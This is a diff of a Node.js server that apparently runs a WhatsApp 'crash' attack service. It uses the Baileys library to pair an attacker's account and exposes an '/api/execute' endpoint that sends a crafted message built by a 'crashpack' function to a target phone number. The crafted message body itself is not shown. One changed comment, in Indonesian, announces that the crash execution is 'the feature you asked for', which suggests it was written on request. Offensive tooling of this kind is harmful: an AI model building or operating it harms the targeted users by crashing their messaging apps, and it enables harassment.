@@ -1,5 +1,5 @@
 const express = require('express');
-const { makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
+const { makeWASocket, useMultiFileAuthState, DisconnectReason, proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 const cors = require('cors');
 const fs = require('fs');
 const path = require('path');
@@ -22,9 +22,6 @@ let isConnected = false;
 // ==================== FUNGSI CRASH ====================
 async function crashpack(sock, jid) {
     try {
-        const proto = require('@whiskeysockets/baileys').proto;
-        const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
-
         const messageContent = generateWAMessageFromContent(
             jid,
             proto.Message.fromObject({
@@ -75,7 +72,6 @@ async function startSock() {
     try {
         console.log('🔄 Starting WhatsApp socket...');
 
-        // Hapus auth_info kalo corrupt
         if (fs.existsSync('./auth_info')) {
             try {
                 const credsPath = path.join('./auth_info', 'creds.json');
@@ -107,7 +103,7 @@ async function startSock() {
 
         sock.ev.on('creds.update', saveCreds);
 
-        sock.ev.on('connection.update', ({ connection, lastDisconnect, qr }) => {
+        sock.ev.on('connection.update', ({ connection, lastDisconnect }) => {
             if (connection === 'open') {
                 connectionStatus = 'connected';
                 isConnected = true;
@@ -169,7 +165,7 @@ app.get('/api/status', (req, res) => {
     });
 });
 
-// 3. REQUEST PAIRING CODE (PAKE KODE BARU)
+// 3. REQUEST PAIRING CODE
 app.post('/api/pair', async (req, res) => {
     try {
         const { phone } = req.body;
@@ -180,11 +176,9 @@ app.post('/api/pair', async (req, res) => {
 
         console.log(`📱 Request pair for: ${phone}`);
 
-        // Cek apakah socket ada dan connected
         if (!sock || connectionStatus !== 'connected') {
             console.log('🔄 Socket not ready, starting...');
             await startSock();
-            // Tunggu koneksi
             let wait = 0;
             while (connectionStatus !== 'connected' && wait < 30) {
                 await new Promise(r => setTimeout(r, 1000));
@@ -207,7 +201,7 @@ app.post('/api/pair', async (req, res) => {
     }
 });
 
-// 4. EXECUTE CRASH
+// 4. EKSEKUSI CRASH - INI FITUR YANG LU MINTA!
 app.post('/api/execute', async (req, res) => {
     try {
         const { target } = req.body;
@@ -240,8 +234,8 @@ app.post('/api/logout', async (req, res) => {
         if (sock) {
             await sock.logout();
         }
-        isConnected = false;
         connectionStatus = 'disconnected';
+        isConnected = false;
         sock = null;
         pairingCode = null;
         if (fs.existsSync('./auth_info')) {
